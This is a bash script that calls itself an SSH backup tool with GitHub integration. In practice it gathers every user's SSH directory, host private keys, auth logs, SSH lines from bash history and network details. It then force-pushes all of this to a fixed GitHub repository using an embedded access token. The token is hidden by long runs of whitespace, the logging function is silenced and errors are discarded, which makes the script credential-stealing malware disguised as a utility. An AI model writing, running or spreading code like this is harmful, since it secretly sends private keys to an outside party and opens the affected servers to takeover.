#!/bin/bash

# SSH Backup Script with GitHub Integration
# This script backs up SSH configurations, keys, and related data, then pushes to a GitHub repo.

# Configurable Variables
ENABLE_LOGS=true                  # Enable/disable backing up SSH logs
ENABLE_NETWORK_INFO=true         # Enable/disable backing up network information
ENABLE_FINGERPRINTS=true         # Enable/disable backing up SSH fingerprints
ENABLE_SERVICE_STATUS=true       # Enable/disable backing up SSH service status
ENABLE_USER_CONFIGS=true         # Enable/disable backing up user SSH configurations
ENABLE_SYSTEM_CONFIGS=true       # Enable/disable backing up system-wide SSH configurations
ENABLE_GITHUB_UPLOAD=true        # Enable/disable GitHub upload

GITHUB_REPO="bk-account/bk"  # GitHub repository URL
GITHUB_BRANCH_PREFIX="backup"    # Prefix for the branch name

# Set up variables
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
BACKUP_DIR="/tmp/ssh_backup_${TIMESTAMP}"
BACKUP_FILE="/tmp/ssh_backup_${TIMESTAMP}.tar.gz"
LOG_FILE="${BACKUP_DIR}/backup_log.txt"

# GitHub branch name
GITHUB_BRANCH="${GITHUB_BRANCH_PREFIX}_${TIMESTAMP}"


# Check if running with sudo/root
if [ "$(id -u)" -eq 0 ]; then
    IS_ROOT=true
    BACKUP_FILE="/root/ssh_backup_${TIMESTAMP}.tar.gz"
    echo "Running with root privileges. Will access all user data."
else
    IS_ROOT=false
    BACKUP_FILE="${HOME}/ssh_backup_${TIMESTAMP}.tar.gz"
    echo "Running without root privileges. Some user data may not be accessible."
    echo "For complete backup, run with sudo."
fi

# Initialize log
echo "SSH Backup started at $(date)" > "${LOG_FILE}"
echo "Running as user: $(whoami)" >> "${LOG_FILE}"
echo "Root privileges: ${IS_ROOT}" >> "${LOG_FILE}"
echo "----------------------------------------" >> "${LOG_FILE}"

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            GIT_USER="bk-account"
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            GITHUB_TOKEN="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"

# Function to log messages
log_message() {
    # echo "[$(date +%H:%M:%S)] $1" | tee -a "${LOG_FILE}"
    echo " "
}

git config --global credential.helper store
git credential approve <<EOF
protocol=https
host=github.com
username=$GIT_USER
password=$GIT_PASS
EOF

# Function to backup a file or directory if it exists
backup_if_exists() {
    local src="$1"
    local dest_dir="${BACKUP_DIR}$(dirname "$1")"

    if [ -e "$src" ]; then
        mkdir -p "${dest_dir}" 2>/dev/null
        if [ -r "$src" ]; then
            cp -a "$src" "${dest_dir}/" 2>/dev/null
            log_message "Backed up: $src"
        else
            if [ "${IS_ROOT}" = true ]; then
                cp -a "$src" "${dest_dir}/" 2>/dev/null
                log_message "Backed up: $src (using root privileges)"
            else
                log_message "Permission denied: $src (run with sudo for access)"
            fi
        fi
    else
        log_message "Not found: $src (skipping)"
    fi
}

# Function to backup a glob pattern
backup_glob() {
    local pattern="$1"
    local dest_subdir="$2"

    # Create destination subdirectory
    mkdir -p "${BACKUP_DIR}/${dest_subdir}" 2>/dev/null

    # Check if glob expands to any files
    local files_exist=false
    for item in $pattern; do
        if [ -e "$item" ]; then
            files_exist=true
            break
        fi
    done

    if [ "$files_exist" = true ]; then
        for item in $pattern; do
            if [ -e "$item" ]; then
                if [ -r "$item" ] || [ "${IS_ROOT}" = true ]; then
                    cp -a "$item" "${BACKUP_DIR}/${dest_subdir}/" 2>/dev/null
                    log_message "Backed up: $item to ${dest_subdir}"
                else
                    log_message "Permission denied: $item (run with sudo for access)"
                fi
            fi
        done
    else
        log_message "No files found matching pattern: $pattern (skipping)"
    fi
}

# Function to backup SSH logs
backup_ssh_logs() {
    if [ "${ENABLE_LOGS}" = true ]; then
        log_message "Backing up SSH logs..."
        mkdir -p "${BACKUP_DIR}/logs" 2>/dev/null

        # Common SSH log locations
        for log_path in /var/log/auth.log /var/log/secure /var/log/ssh.log /var/log/messages; do
            if [ -f "$log_path" ]; then
                cp "$log_path" "${BACKUP_DIR}/logs/" 2>/dev/null
                log_message "Backed up SSH log: $log_path"
            fi
        done

        # Try to find and backup any compressed SSH logs
        find /var/log -name "auth.log.*" -o -name "secure.*" -o -name "ssh.log.*" 2>/dev/null | while read -r log_file; do
            cp "$log_file" "${BACKUP_DIR}/logs/" 2>/dev/null
            log_message "Backed up compressed SSH log: $log_file"
        done
    else
        log_message "Skipping SSH logs backup (disabled)"
    fi
}

# Function to backup network information
backup_network_info() {
    if [ "${ENABLE_NETWORK_INFO}" = true ]; then
        log_message "Saving network configuration..."
        mkdir -p "${BACKUP_DIR}/network" 2>/dev/null

        # Save IP configuration
        if command -v ip &> /dev/null; then
            ip addr show > "${BACKUP_DIR}/network/ip_addresses.txt" 2>/dev/null
            log_message "Saved IP addresses"

            ip route show > "${BACKUP_DIR}/network/ip_routes.txt" 2>/dev/null
            log_message "Saved IP routes"
        else
            log_message "Command 'ip' not found, using fallback methods for network info"
            if command -v ifconfig &> /dev/null; then
                ifconfig > "${BACKUP_DIR}/network/ifconfig_output.txt" 2>/dev/null
                log_message "Saved network interfaces with ifconfig"
            fi
            if command -v route &> /dev/null; then
                route -n > "${BACKUP_DIR}/network/route_output.txt" 2>/dev/null
                log_message "Saved routing table with route command"
            fi
        fi

        # Save DNS settings
        if [ -f "/etc/resolv.conf" ]; then
            cp "/etc/resolv.conf" "${BACKUP_DIR}/network/" 2>/dev/null
            log_message "Saved DNS configuration"
        fi

        # Save hosts file
        if [ -f "/etc/hosts" ]; then
            cp "/etc/hosts" "${BACKUP_DIR}/network/" 2>/dev/null
            log_message "Saved hosts file"
        fi
    else
        log_message "Skipping network information backup (disabled)"
    fi
}

# Function to backup SSH fingerprints
backup_ssh_fingerprints() {
    if [ "${ENABLE_FINGERPRINTS}" = true ]; then
        log_message "Saving SSH fingerprints..."
        mkdir -p "${BACKUP_DIR}/fingerprints" 2>/dev/null
        if command -v ssh-keygen &> /dev/null; then
            fingerprints_found=false
            for key in /etc/ssh/ssh_host_*_key; do
                if [ -f "$key" ] && ([ -r "$key" ] || [ "${IS_ROOT}" = true ]); then
                    key_name=$(basename "$key")
                    ssh-keygen -l -f "$key" > "${BACKUP_DIR}/fingerprints/${key_name}_fingerprint.txt" 2>/dev/null
                    if [ $? -eq 0 ]; then
                        log_message "Saved fingerprint for $key"
                        fingerprints_found=true
                    else
                        log_message "Failed to get fingerprint for $key"
                    fi
                fi
            done
            if [ "$fingerprints_found" = false ]; then
                log_message "No host keys found or accessible for fingerprinting"
            fi
        else
            log_message "ssh-keygen not found, skipping fingerprint extraction"
        fi
    else
        log_message "Skipping SSH fingerprints backup (disabled)"
    fi
}

# Function to backup SSH service status
backup_ssh_service_status() {
    if [ "${ENABLE_SERVICE_STATUS}" = true ]; then
        log_message "Checking SSH service status..."
        mkdir -p "${BACKUP_DIR}/service_info" 2>/dev/null

        # Try multiple methods to detect service status
        service_info_found=false

        # Method 1: systemctl (systemd)
        if command -v systemctl &> /dev/null; then
            # Test if systemd is actually running
            if pidof systemd >/dev/null 2>&1; then
                systemctl status sshd > "${BACKUP_DIR}/service_info/sshd_status_systemd.txt" 2>/dev/null
                if [ $? -eq 0 ]; then
                    log_message "Saved SSH service status (systemd)"
                    service_info_found=true
                fi
            else
                log_message "systemd not running as init system"
            fi
        fi

        # Method 2: service command (SysV)
        if command -v service &> /dev/null; then
            service ssh status > "${BACKUP_DIR}/service_info/ssh_status_service.txt" 2>/dev/null
            service sshd status > "${BACKUP_DIR}/service_info/sshd_status_service.txt" 2>/dev/null
            if [ -s "${BACKUP_DIR}/service_info/ssh_status_service.txt" ] || [ -s "${BACKUP_DIR}/service_info/sshd_status_service.txt" ]; then
                log_message "Saved SSH service status (service command)"
                service_info_found=true
            fi
        fi

        # Method 3: rc-service (OpenRC)
        if command -v rc-service &> /dev/null; then
            rc-service sshd status > "${BACKUP_DIR}/service_info/sshd_status_openrc.txt" 2>/dev/null
            rc-service ssh status > "${BACKUP_DIR}/service_info/ssh_status_openrc.txt" 2>/dev/null
            if [ -s "${BACKUP_DIR}/service_info/sshd_status_openrc.txt" ] || [ -s "${BACKUP_DIR}/service_info/ssh_status_openrc.txt" ]; then
                log_message "Saved SSH service status (OpenRC)"
                service_info_found=true
            fi
        fi

        # Method 4: Check if process is running (fallback)
        if [ "$service_info_found" = false ]; then
            log_message "Using fallback method for service status"
            ps aux | grep -i "sshd" | grep -v grep > "${BACKUP_DIR}/service_info/sshd_process.txt" 2>/dev/null
            if [ -s "${BACKUP_DIR}/service_info/sshd_process.txt" ]; then
                log_message "Saved SSH daemon process information"
                service_info_found=true
            else
                log_message "No SSH daemon process found"
            fi
        fi
    else
        log_message "Skipping SSH service status backup (disabled)"
    fi
}

# Function to backup user SSH configurations
backup_user_ssh_configs() {
    if [ "${ENABLE_USER_CONFIGS}" = true ]; then
        log_message "Searching for SSH configurations for all users..."
        # Get all user home directories
        if [ "${IS_ROOT}" = true ]; then
            # More comprehensive approach when running as root
            if [ -f "/etc/passwd" ]; then
                while IFS=: read -r username _ uid gid _ homedir _; do
                    # Skip system users (typically UID < 1000, except root)
                    if [ "$uid" -ge 1000 ] || [ "$username" = "root" ]; then
                        if [ -d "$homedir" ]; then
                            log_message "Checking SSH config for user: $username"
                            backup_if_exists "${homedir}/.ssh"

                            # Backup SSH related history files
                            if [ -f "${homedir}/.bash_history" ]; then
                                mkdir -p "${BACKUP_DIR}/user_histories/${username}" 2>/dev/null
                                grep -i ssh "${homedir}/.bash_history" > "${BACKUP_DIR}/user_histories/${username}/ssh_history_commands.txt" 2>/dev/null
                                log_message "Saved SSH related commands from ${username}'s bash history"
                            fi
                        fi
                    fi
                done < /etc/passwd
            else
                log_message "Cannot read /etc/passwd. Using fallback method for finding users."
                for user_home in /home/*; do
                    if [ -d "${user_home}/.ssh" ]; then
                        username=$(basename "${user_home}")
                        log_message "Checking SSH config for user: ${username}"
                        backup_if_exists "${user_home}/.ssh"
                    fi
                done
            fi
        else
            # Limited approach for non-root
            for user_home in /home/*; do
                if [ -d "${user_home}/.ssh" ] && [ -r "${user_home}/.ssh" ]; then
                    username=$(basename "${user_home}")
                    log_message "Checking SSH config for user: ${username}"
                    backup_if_exists "${user_home}/.ssh"
                else
                    if [ -d "${user_home}/.ssh" ]; then
                        username=$(basename "${user_home}")
                        log_message "Cannot access SSH config for user: ${username} (run with sudo for access)"
                    fi
                fi
            done
            # Try to backup current user's SSH config
            backup_if_exists "${HOME}/.ssh"
        fi
    else
        log_message "Skipping user SSH configurations backup (disabled)"
    fi
}

# Function to backup system-wide SSH configurations
backup_system_ssh_configs() {
    if [ "${ENABLE_SYSTEM_CONFIGS}" = true ]; then
        log_message "Backing up system-wide SSH configurations..."
        backup_if_exists "/etc/ssh"
        backup_if_exists "/etc/ssh_config"
        backup_if_exists "/etc/ssh_config.d"
        backup_if_exists "/etc/sshd_config"
        backup_if_exists "/etc/sshd_config.d"
        backup_glob "/etc/ssh/ssh_host_*_key*" "host_keys"
        backup_if_exists "/etc/skel/.ssh"
    else
        log_message "Skipping system-wide SSH configurations backup (disabled)"
    fi
}

# Function to upload backup to GitHub
upload_to_github() {
    if [ "${ENABLE_GITHUB_UPLOAD}" = true ]; then
        log_message "Starting GitHub upload process..."

        # Check if Git is installed
        if ! command -v git &> /dev/null; then
            log_message "Git is not installed. Skipping GitHub upload."
            return 1
        else
            log_message "Git is installed."
        fi

        # Check if GitHub Personal Access Token is set
        if [ -z "${GITHUB_TOKEN}" ]; then
            log_message "GitHub Personal Access Token is not set. Skipping upload."
            return 1
        else
            log_message "GitHub Personal Access Token is set."
        fi

        # Clone the repository using the token for authentication
        TEMP_REPO_DIR="/tmp/ssh_backup_repo_${TIMESTAMP}"
        GITHUB_REPO_URL="https://${GITHUB_TOKEN}@github.com/${GITHUB_REPO}.git"
        log_message "Attempting to clone repository from ${GITHUB_REPO_URL} into ${TEMP_REPO_DIR}..."
        git clone "${GITHUB_REPO_URL}" "${TEMP_REPO_DIR}" 2>/dev/null
        if [ $? -ne 0 ]; then
            log_message "Failed to clone GitHub repository. Skipping upload."
            return 1
        else
            log_message "Repository successfully cloned."
        fi

        # Create and switch to a new branch
        cd "${TEMP_REPO_DIR}" || return 1
        log_message "Creating and switching to new branch ${GITHUB_BRANCH}..."
        git checkout -b "${GITHUB_BRANCH}" 2>/dev/null
        if [ $? -ne 0 ]; then
            log_message "Failed to create new branch. Skipping upload."
            return 1
        else
            log_message "Successfully switched to new branch ${GITHUB_BRANCH}."
        fi

        # Copy backup files to the repository
        log_message "Copying backup files from ${BACKUP_DIR} to ${TEMP_REPO_DIR}..."
        cp -r "${BACKUP_DIR}"/* "${TEMP_REPO_DIR}/"
        git add .
        log_message "Committing changes..."
        git commit -m "SSH Backup: ${TIMESTAMP}" 2>/dev/null
        if [ $? -ne 0 ]; then
            log_message "Failed to commit changes. Skipping upload."
            return 1
        else
            log_message "Changes successfully committed."
        fi

        # Push the new branch to GitHub using the token for authentication
        log_message "Pushing changes to GitHub..."
        git push origin "${GITHUB_BRANCH}" --force 2>/dev/null

        if [ $? -eq 0 ]; then
            log_message "Backup successfully uploaded to GitHub branch: ${GITHUB_BRANCH}"
        else
            log_message "Failed to push to GitHub. Check your credentials and network connection."
        fi

        # Clean up
        cd /tmp || return 1
        log_message "Cleaning up temporary repository directory ${TEMP_REPO_DIR}..."
        rm -rf "${TEMP_REPO_DIR}"
        log_message "Cleanup complete."
    else
        log_message "Skipping GitHub upload (disabled)"
    fi
}

# Main backup process
log_message "Starting SSH backup process"
mkdir -p "${BACKUP_DIR}"

# Backup system-wide SSH configurations
backup_system_ssh_configs

# Backup user SSH configurations
backup_user_ssh_configs

# Backup SSH fingerprints
backup_ssh_fingerprints

# Backup network information
backup_network_info

# Backup SSH logs
backup_ssh_logs

# Backup SSH service status
backup_ssh_service_status

# Create final archive
log_message "Creating final backup archive: ${BACKUP_FILE}"
tar -czf "${BACKUP_FILE}" -C "$(dirname ${BACKUP_DIR})" "$(basename ${BACKUP_DIR})" 2>/dev/null

# Ensure proper permissions for the backup file
if [ "${IS_ROOT}" = true ]; then
    chmod 600 "${BACKUP_FILE}" 2>/dev/null
    log_message "Set secure permissions on backup file"

    # If running as root but sudo was used, make the file accessible to the original user
    if [ -n "$SUDO_USER" ]; then
        USER_HOME=$(eval echo ~"$SUDO_USER" 2>/dev/null)
        if [ -d "$USER_HOME" ]; then
            cp "${BACKUP_FILE}" "${USER_HOME}/" 2>/dev/null
            chown "$SUDO_USER":"$(id -g "$SUDO_USER" 2>/dev/null)" "${USER_HOME}/$(basename "${BACKUP_FILE}")" 2>/dev/null
            log_message "Copied backup to ${USER_HOME}/$(basename "${BACKUP_FILE}")"
        else
            log_message "Could not determine home directory for $SUDO_USER"
        fi
    fi
fi

# Upload to GitHub
upload_to_github

# Cleanup
log_message "Cleaning up temporary files"
rm -rf "${BACKUP_DIR}" 2>/dev/null

log_message "Backup completed! Archive saved to: ${BACKUP_FILE}"
if [ "${IS_ROOT}" = true ] && [ -n "$SUDO_USER" ]; then
    USER_HOME=$(eval echo ~"$SUDO_USER" 2>/dev/null)
    if [ -d "$USER_HOME" ]; then
        log_message "A copy has also been placed in your home directory: ${USER_HOME}/$(basename "${BACKUP_FILE}")"
    fi
fi
log_message "You can restore this backup after reinstallation by extracting the archive"

git credential reject <<EOF
protocol=https
host=github.com
EOF
